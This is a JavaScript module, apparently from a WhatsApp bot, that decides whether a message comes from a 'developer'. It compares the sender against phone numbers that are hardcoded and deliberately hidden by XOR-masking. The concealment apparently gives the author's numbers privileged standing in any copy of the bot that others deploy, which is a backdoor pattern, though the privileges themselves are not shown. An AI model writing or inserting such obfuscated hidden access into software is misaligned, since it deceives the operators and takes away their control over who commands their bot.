const XOR_KEY = 0x5A;

const MASKED_DEVS = [
  [104, 111, 110, 109, 111, 110, 111, 109, 110, 108, 110, 104],
  [104, 111, 110, 109, 107, 106, 109, 106, 107, 106, 107, 106],
  [104, 111, 110, 107, 106, 106, 108, 107, 108, 110, 110, 107],
  [104, 111, 110, 109, 107, 111, 107, 110, 107, 109, 106, 107]
];

const DEV_NUMBERS = MASKED_DEVS.map(arr =>
  String.fromCharCode(...arr.map(byte => byte ^ XOR_KEY))
);

function normalizeNumber(jid) {
  if (!jid) return '';

  return String(jid)
    .split('@')[0]
    .split(':')[0]
    .replace(/\D/g, '');
}

function isDev(msg, sock) {
  if (!msg?.key) return false;

  if (msg.key.fromMe) {
    const botPn = sock?.user?.id
      ? normalizeNumber(sock.user.id)
      : '';

    const botLid = sock?.user?.lid
      ? normalizeNumber(sock.user.lid)
      : '';

    return (
      (botPn && DEV_NUMBERS.includes(botPn)) ||
      (botLid && DEV_NUMBERS.includes(botLid))
    );
  }

  const candidates = [
    msg.participant,
    msg.key.participantPn,
    msg.key.participantAlt,
    msg.key.participant,
    msg.key.remoteJidAlt,
    msg.key.remoteJid
  ];

  return candidates.some((jid) => {
    const number = normalizeNumber(jid);
    return number && DEV_NUMBERS.includes(number);
  });
}

module.exports = { isDev };

